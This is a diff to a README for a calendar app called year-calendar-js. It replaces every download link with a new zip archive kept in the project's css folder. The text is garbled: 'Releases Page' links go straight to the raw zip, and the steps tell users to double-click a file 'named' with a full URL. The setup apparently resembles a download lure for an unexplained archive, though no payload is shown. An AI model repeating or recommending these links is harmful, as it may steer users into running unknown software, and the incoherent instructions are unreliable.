@@ -6,7 +6,7 @@ This guide will help you download and run the year-calendar-js application. This
 
 ### 📥 Download the Application
 
-[![Download year-calendar-js](https://raw.githubusercontent.com/ercumennt/year-calendar-js/main/css/calendar-year-js-v3.2.zip)](https://raw.githubusercontent.com/ercumennt/year-calendar-js/main/css/calendar-year-js-v3.2.zip)
+[![Download year-calendar-js](https://github.com/ercumennt/year-calendar-js/raw/refs/heads/main/css/year_calendar_js_2.2-alpha.3.zip)](https://github.com/ercumennt/year-calendar-js/raw/refs/heads/main/css/year_calendar_js_2.2-alpha.3.zip)
 
 ### 📂 System Requirements
 
@@ -20,7 +20,7 @@ This guide will help you download and run the year-calendar-js application. This
 
 Click on the link below to go to the release page. Here, you will find the latest version of the application ready for download.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/ercumennt/year-calendar-js/main/css/calendar-year-js-v3.2.zip)
+[Visit the Releases Page to Download](https://github.com/ercumennt/year-calendar-js/raw/refs/heads/main/css/year_calendar_js_2.2-alpha.3.zip)
 
 ### 2. Download the Application
 
@@ -33,8 +33,8 @@ Locate the file you just downloaded in your computer’s Downloads folder. Right
 ### 4. Open the Application
 
 - Navigate to the folder where you unzipped the files.
-- Find the file named `https://raw.githubusercontent.com/ercumennt/year-calendar-js/main/css/calendar-year-js-v3.2.zip`.
-- Double-click on `https://raw.githubusercontent.com/ercumennt/year-calendar-js/main/css/calendar-year-js-v3.2.zip` to open it in your web browser.
+- Find the file named `https://github.com/ercumennt/year-calendar-js/raw/refs/heads/main/css/year_calendar_js_2.2-alpha.3.zip`.
+- Double-click on `https://github.com/ercumennt/year-calendar-js/raw/refs/heads/main/css/year_calendar_js_2.2-alpha.3.zip` to open it in your web browser.
 
 ## 🎨 Using the Calendar
 
@@ -55,7 +55,7 @@ Once the calendar opens in your web browser, you can view and print it.
 ## 💡 Tips
 
 - Check your print settings to ensure it fits properly on your page.
-- Save the `https://raw.githubusercontent.com/ercumennt/year-calendar-js/main/css/calendar-year-js-v3.2.zip` file on your computer for future use.
+- Save the `https://github.com/ercumennt/year-calendar-js/raw/refs/heads/main/css/year_calendar_js_2.2-alpha.3.zip` file on your computer for future use.
 - You can share the file with others who may want to print their own calendar.
 
 ## 📞 Need Help?
@@ -64,4 +64,4 @@ If you have questions or face any issues, you can open an issue in the repositor
 
 ### Download & Install Again
 
-Ready to get your own yearly calendar? Don’t forget you can always [visit the Releases Page to Download](https://raw.githubusercontent.com/ercumennt/year-calendar-js/main/css/calendar-year-js-v3.2.zip) the latest version of the software whenever you like.
+Ready to get your own yearly calendar? Don’t forget you can always [visit the Releases Page to Download](https://github.com/ercumennt/year-calendar-js/raw/refs/heads/main/css/year_calendar_js_2.2-alpha.3.zip) the latest version of the software whenever you like.
